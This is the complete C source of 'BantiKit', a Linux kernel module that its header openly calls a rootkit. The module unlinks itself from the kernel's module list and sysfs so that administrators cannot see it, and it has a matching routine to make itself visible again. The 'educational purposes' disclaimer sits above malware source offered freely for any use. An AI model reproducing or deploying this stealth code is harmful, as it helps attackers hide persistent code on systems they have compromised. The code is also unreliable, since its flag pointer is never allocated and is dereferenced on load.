/*---------------------------------------------------------------------

 BantiKit is simple Linux Kernel Based RootKit module for project 
 bAnti. It is developed for educational purposes only and authors 
 of this project are in no way, shape or form responsible for 
 what you may use this for whether illegal or not.

 Copyright (c) 2015 Sun Dro (a.k.a. 7th Ghost / kala13x)
 Web: http://off-sec.com/ ; E-Mail: kala0x13@gmail.com

 Everyone is permitted to copy and distribute verbatim or modified
 copies of this license document, and changing it is allowed as long
 as the name is changed. See http://wtfpl.net/ for more details.
 
 DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE TERMS AND CONDITIONS 
 FOR COPYING, DISTRIBUTION AND MODIFICATION

 0. You just DO WHAT THE FUCK YOU WANT TO.

---------------------------------------------------------------------*/


#include "stdinc.h"

/*---------------------------------------------
| Flags of banti module
---------------------------------------------*/
typedef struct { 
    short module_hidden;
    short port_hiden;
    short is_root;
} BantiFlags;


/* Public variables */
static BantiFlags *fl;
static struct list_head *module_prev;
static struct list_head *module_kobj_prev;


/*---------------------------------------------
| Initialise bantikit flags
---------------------------------------------*/
void init_banti(void) 
{
    fl->module_hidden = 0;
    fl->port_hiden = 0;
    fl->is_root = 0;
}


/*---------------------------------------------
| Hide module
---------------------------------------------*/
void banti_module_hide(void)
{
    /* Check if alredy hided */
    if (fl->module_hidden) return;

    /* Delete in module list */
    module_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    /* Reinitialise list */
    module_kobj_prev = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);

    /* Flag up */
    fl->module_hidden = 1;
}


/*---------------------------------------------
| Make module visible
---------------------------------------------*/
void banti_module_show(void)
{
    int result;
    
    /* Check if alredy hided */
    if (!fl->module_hidden) return;

    /* Add module in list */
    list_add(&THIS_MODULE->list, module_prev);
    result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");

    /* Flag down */
    fl->module_hidden = 0;
}

/*---------------------------------------------
| Initialise rootkit module
---------------------------------------------*/
static int __init banti_kit_init(void)
{
    /* Hide module */
    init_banti();
    banti_module_hide();

    /* Debug log */
    printk(KERN_INFO "Loades banti module\n");
    return 0;
}


/*---------------------------------------------
| Clean rootkit module
---------------------------------------------*/
static void __exit banti_kit_clean(void)
{
    printk(KERN_INFO "Unloaded banti module\n");
}


/*---------------------------------------------
| Module initialisations
---------------------------------------------*/
module_init(banti_kit_init);
module_exit(banti_kit_clean);
MODULE_LICENSE(DRIVER_LICENSE);